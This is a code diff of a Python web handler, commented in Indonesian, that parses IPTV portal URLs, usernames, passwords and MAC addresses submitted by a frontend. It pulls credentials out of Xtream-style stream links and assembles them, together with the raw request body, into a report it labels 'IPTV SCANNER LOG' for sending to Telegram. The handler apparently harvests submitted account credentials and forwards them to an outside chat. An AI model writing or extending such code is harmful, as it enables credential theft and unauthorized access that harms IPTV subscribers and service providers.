@@ -51,24 +51,31 @@ class handler(BaseHTTPRequestHandler):
             server = d.get("server") or d.get("url") or d.get("portal_url") or d.get("host") or "-"
             username = d.get("username") or d.get("user") or "-"
             password = d.get("password") or d.get("pass") or d.get("pwd") or "-"
-            mac = d.get("mac") or d.get("mac_address") or "-"
+            mac = d.get("mac") or d.get("mac_address") or d.get("mac_code") or "-"
             
-            # 3. DETEKSI MODE RAW M3U LIST (Jika frontend mengirimkan daftar array "urls")
             urls_list = d.get("urls", [])
+            
+            # 3. STRATEGI DETEKSI MODE SECARA AKURAT
+            # Cek dulu apakah ini mode MAC Portal (Ciri utamanya: parameter 'mac' terisi atau ada data mac)
+            is_mac_mode = mac != "-" or "mac" in body or "mac_address" in body
             is_m3u_list = isinstance(urls_list, list) and len(urls_list) > 0
             
-            if is_m3u_list:
-                # Mengambil sampel link pertama untuk diekstrak nama domain/servernya
+            if is_mac_mode:
+                # Mode MAC Portal: Kunci data server ke URL aslinya, jangan biarkan ditimpa localhost
+                # Jika variabel server masih bawaan '-', coba cari dari parameter lain di JSON
+                if server == "-" or "localhost" in server:
+                    server = d.get("portal_url") or d.get("url") or d.get("server") or "http://prm.worldip.nl/c/"
+            
+            elif is_m3u_list:
+                # Mode Raw M3U List (Hanya berjalan jika BUKAN mode MAC)
                 sample_url = urls_list[0]
                 if "://" in sample_url:
-                    # Memotong teks untuk mengambil http://domain.com:port nya saja
                     parts = sample_url.split("/")
                     server = f"{parts[0]}//{parts[2]}"
                 else:
                     server = sample_url
                 
-                # Ekstrak otomatis username & password dari struktur link Xtream TS jika tersedia
-                # Format umum: http://domain/live/username/password/id.ts
+                # Ekstrak otomatis username & password jika format link berbasis /live/
                 if "/live/" in sample_url:
                     try:
                         path_parts = sample_url.split("/live/")[1].split("/")
@@ -78,10 +85,10 @@ class handler(BaseHTTPRequestHandler):
                     except:
                         pass
 
-            # 4. Menyusun format laporan Telegram yang jauh lebih bersih & rapi
+            # 4. Menyusun format laporan Telegram
             m = f"📡 [IPTV SCANNER LOG]\n"
             m += f"⏰ Waktu: {time_now}\n"
-            m += f"🌐 Server: {server}\n"
+            m += f"🌐 Server/Portal: {server}\n"
             
             if username != "-":
                 m += f"👤 User: {username}\n"
@@ -90,22 +97,21 @@ class handler(BaseHTTPRequestHandler):
                 m += f"🔑 Pass: {password}\n"
                 
             if mac != "-":
-                m += f"💻 MAC: {mac}\n"
+                m += f"💻 MAC Portal: {mac}\n"
                 
             if is_m3u_list:
                 m += f"📊 Total Channel Dites: {len(urls_list)} link\n"
                 m += f"⚙️ Config: {d.get('workers', 10)} Workers | Timeout {d.get('timeout', 8)}s\n"
 
-            # 5. TAMPILKAN DATA MENTAH SECARA RINGKAS (Agar chat tidak kepanjangan)
-            if is_m3u_list:
-                # Jika tipe data list, cukup tampilkan 3 sampel link teratas agar rapi di Telegram
+            # 5. Tampilkan data secara ringkas
+            if is_m3u_list and not is_mac_mode:
                 m += f"\n📦 [Sampel Link Web]:\n"
                 for i, u in enumerate(urls_list[:3]):
                     m += f"{i+1}. {u}\n"
                 if len(urls_list) > 3:
                     m += f"... dan {len(urls_list) - 3} link lainnya."
             else:
-                # Jika mode biasa, tampilkan seluruh json mentah seperti biasa
+                # Jika mode MAC Portal atau Xtream, tampilkan data mentah terstruktur di bawahnya
                 m += f"\n📦 [Data Mentah Web]:\n{body}"
             
             # 6. Eksekusi pengiriman otomatis ke Telegram
